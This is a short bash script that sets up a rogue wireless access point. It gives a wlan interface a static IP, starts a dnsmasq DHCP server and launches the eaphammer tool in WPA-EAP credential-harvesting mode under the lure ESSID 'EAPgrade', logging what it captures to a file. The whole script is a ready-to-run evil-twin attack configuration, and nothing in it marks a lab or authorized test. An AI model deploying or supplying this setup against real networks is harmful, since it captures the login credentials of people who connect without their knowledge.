#!/usr/bin/env bash

# wireless interface selection
INTERFACE='wlan0'
if [ -d '/sys/class/net/wlan1/' ]
then
    INTERFACE='wlan1'
fi
readonly INTERFACE

# static ip configuration
ip link set dev "${INTERFACE}" down
ip address flush dev "${INTERFACE}"
ip address add '10.0.0.1/24' broadcast '+' dev "${INTERFACE}"
ip link set dev "${INTERFACE}" up

# dnsmasq launch
dnsmasq --interface="${INTERFACE}" --except-interface='lo' --bind-interfaces --dhcp-range='10.0.0.2,10.0.0.16,12h'

# eaphammer launch
/opt/eaphammer/eaphammer --interface "${INTERFACE}" --channel '1' --auth 'wpa-eap' --creds --hw-mode 'g' --essid 'EAPgrade' &>> '/opt/eaphammer/logs/hostapd-eaphammer.raw'
